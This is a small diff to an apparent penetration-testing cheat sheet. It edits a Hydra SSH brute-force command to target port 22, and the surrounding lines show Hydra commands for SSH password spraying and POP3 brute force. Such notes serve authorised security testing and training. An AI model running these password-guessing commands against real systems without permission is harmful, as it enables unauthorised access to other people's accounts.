@@ -1629,8 +1629,8 @@ Client, Web and Password Attacks
         -   Hydra SSH using a known password and a username list  
             `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`
 
-        -   Hydra SSH Against Known username  
-            `hydra $ip -s 62964 ssh -l <user> -P big\_wordlist.txt`
+        -   Hydra SSH Against Known username on port 22
+            `hydra $ip -s 22 ssh -l <user> -P big\_wordlist.txt`
 
         -   Hydra POP3 Brute Force  
             `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`
